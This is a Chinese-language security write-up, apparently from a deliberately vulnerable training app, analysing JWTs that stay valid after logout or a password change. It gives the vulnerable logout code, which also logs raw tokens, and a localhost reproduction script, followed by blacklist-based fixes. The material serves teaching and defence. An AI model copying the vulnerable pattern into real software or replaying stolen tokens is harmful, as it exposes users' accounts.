# 问题5: 用户注销后JWT仍然有效 - 详细分析

**文档版本**: 1.0  
**创建日期**: 2026-05-01

---

## 1. 问题描述

用户注销登录后，JWT令牌仍然有效，攻击者可以使用已注销的令牌继续访问受保护的资源。

**典型场景**:
1. 用户在公共设备上登录
2. 用户点击"注销"后离开
3. 攻击者获取到JWT令牌（从浏览器存储、网络日志等）
4. 攻击者使用该令牌继续访问用户账户
5. 即使密码已被修改，旧令牌仍然有效

---

## 2. 问题代码位置

**文件**: `server/api/vulnerable/auth/logout.post.ts:1-10`

```typescript
export default defineEventHandler(async (event) => {
  const token = extractTokenFromEvent(event);
  
  console.log('用户注销，token:', token);
  
  return {
    success: true,
    message: '注销成功',
  };
});
```

---

## 3. 根本原因详细分析

### 3.1 JWT的无状态特性

**核心问题**: JWT是无状态的，服务器无法主动使令牌失效。

#### 3.1.1 JWT的工作原理

```
┌─────────────────────────────────────────────────────────────┐
│                      传统Session方式                           │
├─────────────────────────────────────────────────────────────┤
│  用户登录                                                      │
│     ↓                                                         │
│  服务器创建Session，存储在内存/数据库                          │
│  Session ID: "abc123"                                         │
│     ↓                                                         │
│  返回Session ID给客户端                                         │
│     ↓                                                         │
│  后续请求携带Session ID                                         │
│     ↓                                                         │
│  服务器查询Session是否存在、是否过期                             │
│     ↓                                                         │
│  注销时: 删除Session → 立即使令牌失效                          │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│                      JWT方式 (有问题)                         │
├─────────────────────────────────────────────────────────────┤
│  用户登录                                                      │
│     ↓                                                         │
│  服务器生成JWT令牌（包含用户信息、过期时间、签名）                │
│  JWT: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."             │
│     ↓                                                         │
│  返回JWT给客户端                                                │
│     ↓                                                         │
│  后续请求携带JWT                                                 │
│     ↓                                                         │
│  服务器验证签名、检查过期时间                                     │
│     ↓                                                         │
│  ❌ 注销时: 只是打印日志，没有使令牌失效                          │
│     ↓                                                         │
│  ❌ 旧令牌仍然可以被验证通过                                      │
└─────────────────────────────────────────────────────────────┘
```

#### 3.1.2 JWT的结构

```
JWT格式: header.payload.signature

┌──────────┐    ┌──────────────────┐    ┌──────────────────┐
│  Header  │ .  │     Payload      │ .  │     Signature    │
├──────────┤    ├──────────────────┤    ├──────────────────┤
│{         │    │{                 │    │ HMACSHA256(      │
│  "alg":  │    │  "userId": 1,    │    │   base64(header) │
│  "HS256" │    │  "exp": 1714608,│    │   + "." +        │
│}         │    │  "iat": 1714521,│    │   base64(payload)│
└──────────┘    │  "iss": "app"   │    │   , secret_key)   │
                │}                 │    └──────────────────┘
                └──────────────────┘
```

**关键问题**:
- `payload.exp` 是过期时间
- 只要签名有效且未过期，服务器就会接受
- 服务器**不会**检查令牌是否已被"注销"

### 3.2 问题场景分析

#### 3.2.1 场景1: 公共设备登录

```
时间线:
T0: 用户在网吧电脑上登录
    - 服务器返回JWT令牌
    - 令牌存储在浏览器localStorage中

T1: 用户点击"注销"
    - 服务器只是打印日志
    - 服务器返回"注销成功"
    - 浏览器可能清除了本地存储
    - ❌ 但令牌本身仍然有效！

T2: 攻击者访问同一台电脑
    - 如果浏览器没有清除干净，攻击者获取到令牌
    - 或者从网络日志、内存转储中获取令牌

T3: 攻击者使用令牌访问API
    - GET /api/user/profile
    - Authorization: Bearer <stolen_token>
    
T4: 服务器验证令牌
    - 签名有效？✅
    - 未过期？✅
    - ❌ 是否在黑名单中？没有检查！
    
T5: 服务器返回用户信息
    - 攻击者成功访问用户账户
```

#### 3.2.2 场景2: 令牌泄露后无法撤销

```
场景: 用户手机丢失，令牌存储在手机上

传统Session方式:
- 用户可以在其他设备上登录
- 选择"注销所有设备"
- 服务器删除所有相关Session
- ✅ 旧令牌立即使失效

JWT方式 (有问题):
- 用户在其他设备上修改密码
- ❌ 旧令牌仍然有效（JWT不依赖密码）
- ❌ 攻击者可以继续使用令牌
- ❌ 服务器无法撤销已发出的令牌
```

#### 3.2.3 场景3: 密码修改后旧令牌仍有效

```
用户操作:
1. 用户登录，获取令牌A
2. 用户怀疑令牌泄露，修改密码
3. 用户使用新密码登录，获取令牌B

问题:
- ❌ 令牌A仍然有效
- ❌ 令牌A可以继续访问所有资源
- ❌ 修改密码不会使旧令牌失效

为什么:
JWT的签名使用的是服务器密钥（JWT_SECRET），不是用户密码
```

### 3.3 攻击利用场景

#### 3.3.1 横向移动攻击

```
攻击者已获取一个用户的令牌:

1. 使用令牌访问用户数据
   GET /api/user/profile
   GET /api/subscriptions
   GET /api/articles/my

2. 尝试提升权限
   检查用户是否是管理员
   尝试访问管理员接口

3. 持久化访问
   即使原用户修改密码，令牌仍然有效
   攻击者可以长期访问

4. 横向移动
   如果令牌中包含敏感信息，尝试访问其他用户
   尝试越权操作
```

#### 3.3.2 业务逻辑攻击

```
场景: 用户订阅服务

1. 用户购买订阅，获取令牌
2. 用户申请退款，账户被标记为"已取消"
3. ❌ 旧令牌仍然可以访问订阅内容
4. 攻击者可以免费使用服务
```

### 3.4 JWT安全风险总结

| 风险类型 | 描述 | 严重程度 |
|----------|------|----------|
| 令牌泄露无法撤销 | 令牌泄露后无法立即使其失效 | **严重** |
| 密码修改不影响令牌 | 修改密码后旧令牌仍然有效 | **严重** |
| 多设备登录无法控制 | 无法单独撤销某个设备的令牌 | 高 |
| 会话管理缺失 | 无法查看、管理用户的活跃会话 | 中 |
| 强制下线功能缺失 | 管理员无法强制用户下线 | 中 |

---

## 4. 问题复现步骤

### 4.1 环境准备

1. **启动目标服务器**:
```bash
cd server-backend
npm run dev
```

### 4.2 攻击脚本

```typescript
// jwt-attack-test.ts

const BASE_URL = 'http://localhost:3000';

async function testJwtVulnerability() {
  console.log('=== JWT注销漏洞测试 ===\n');

  // 步骤1: 用户登录
  console.log('1. 用户登录...');
  const loginResponse = await fetch(`${BASE_URL}/api/vulnerable/auth/login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      username: 'testuser',
      password: 'testpass',
    }),
  });

  const loginData = await loginResponse.json();
  const token = loginData.data?.token;
  console.log('   获取到令牌:', token?.substring(0, 50) + '...');

  // 步骤2: 使用令牌访问受保护资源
  console.log('\n2. 使用令牌访问受保护资源...');
  const profileBefore = await fetch(`${BASE_URL}/api/user/profile`, {
    headers: { 'Authorization': `Bearer ${token}` },
  });
  console.log('   访问状态:', profileBefore.status);
  console.log('   响应:', await profileBefore.text());

  // 步骤3: 用户注销
  console.log('\n3. 用户注销...');
  const logoutResponse = await fetch(`${BASE_URL}/api/vulnerable/auth/logout`, {
    method: 'POST',
    headers: { 'Authorization': `Bearer ${token}` },
  });
  const logoutData = await logoutResponse.json();
  console.log('   注销响应:', logoutData.message);

  // 步骤4: 注销后再次使用同一令牌
  console.log('\n4. 注销后再次使用同一令牌...');
  const profileAfter = await fetch(`${BASE_URL}/api/user/profile`, {
    headers: { 'Authorization': `Bearer ${token}` },
  });
  console.log('   访问状态:', profileAfter.status);
  
  if (profileAfter.status === 200) {
    console.log('   ❌ 发现漏洞！注销后令牌仍然有效！');
    console.log('   响应:', await profileAfter.text());
  } else {
    console.log('   ✅ 令牌已失效');
  }

  // 步骤5: 测试修改密码后旧令牌是否有效
  console.log('\n5. 测试修改密码后旧令牌是否有效...');
  
  // 修改密码
  await fetch(`${BASE_URL}/api/vulnerable/auth/change-password`, {
    method: 'POST',
    headers: { 
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${token}` 
    },
    body: JSON.stringify({
      oldPassword: 'testpass',
      newPassword: 'newtestpass',
    }),
  });

  // 使用旧令牌访问
  const profileAfterPasswordChange = await fetch(`${BASE_URL}/api/user/profile`, {
    headers: { 'Authorization': `Bearer ${token}` },
  });
  console.log('   修改密码后访问状态:', profileAfterPasswordChange.status);
  
  if (profileAfterPasswordChange.status === 200) {
    console.log('   ❌ 发现漏洞！修改密码后旧令牌仍然有效！');
  } else {
    console.log('   ✅ 修改密码后令牌已失效');
  }
}

testJwtVulnerability()
  .then(() => console.log('\n=== 测试完成 ==='))
  .catch(console.error);
```

### 4.3 预期结果

运行测试脚本后，如果看到以下输出，说明存在漏洞：

```
=== JWT注销漏洞测试 ===

1. 用户登录...
   获取到令牌: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

2. 使用令牌访问受保护资源...
   访问状态: 200
   响应: {"success":true,"data":{"userId":1,"username":"testuser"...}}

3. 用户注销...
   注销响应: 注销成功

4. 注销后再次使用同一令牌...
   访问状态: 200
   ❌ 发现漏洞！注销后令牌仍然有效！
   响应: {"success":true,"data":{"userId":1,"username":"testuser"...}}

5. 测试修改密码后旧令牌是否有效...
   修改密码后访问状态: 200
   ❌ 发现漏洞！修改密码后旧令牌仍然有效！

=== 测试完成 ===
```

---

## 5. 根本原因总结

| 问题层级 | 具体问题 | 根本原因 |
|----------|----------|----------|
| **架构设计** | JWT无状态特性 | 服务器无法主动撤销令牌 |
| **业务逻辑** | 注销接口只是打印日志 | 没有实现令牌黑名单机制 |
| **安全意识** | 没有考虑令牌泄露场景 | 认为JWT"天然安全" |
| **会话管理** | 缺少会话管理功能 | 无法查看、管理用户的活跃会话 |

### 5.1 核心问题

1. **JWT的无状态特性**:
   - 服务器不存储会话状态
   - 无法主动撤销已发出的令牌
   - 需要额外的机制来管理令牌状态

2. **注销接口功能缺失**:
   ```typescript
   // ❌ 问题代码：只是打印日志
   export default defineEventHandler(async (event) => {
     const token = extractTokenFromEvent(event);
     console.log('用户注销，token:', token);  // 只是打印
     return { success: true, message: '注销成功' };
   });
   
   // ✅ 应该：将令牌加入黑名单
   export default defineEventHandler(async (event) => {
     const token = extractTokenFromEvent(event);
     await addToBlacklist(token, user.userId);  // 加入黑名单
     return { success: true, message: '注销成功' };
   });
   ```

3. **令牌验证时缺少黑名单检查**:
   ```typescript
   // ❌ 问题代码：只验证签名和过期时间
   export const verifyToken = (token: string) => {
     try {
       return jwt.verify(token, JWT_SECRET);  // 只验证签名
     } catch {
       return null;
     }
   };
   
   // ✅ 应该：同时检查是否在黑名单中
   export const verifyToken = async (token: string) => {
     try {
       // 1. 检查是否在黑名单中
       const isBlacklisted = await isTokenBlacklisted(token);
       if (isBlacklisted) return null;
       
       // 2. 验证签名
       return jwt.verify(token, JWT_SECRET);
     } catch {
       return null;
     }
   };
   ```

---

## 6. 相关代码文件

| 文件路径 | 问题类型 | 状态 |
|----------|----------|------|
| `server/api/vulnerable/auth/logout.post.ts` | 注销只是打印日志 | ❌ 有问题 |
| `server/utils/jwt.ts` | JWT验证没有黑名单检查 | ❌ 有问题 |
| `server/api/fixed/auth/logout.post.ts` | 已修复（加入黑名单） | ✅ 修复 |
| `server/utils/token-blacklist.ts` | 令牌黑名单工具类 | ✅ 新增 |
| `server/utils/jwt-fixed.ts` | 增强的JWT验证（含黑名单检查） | ✅ 新增 |
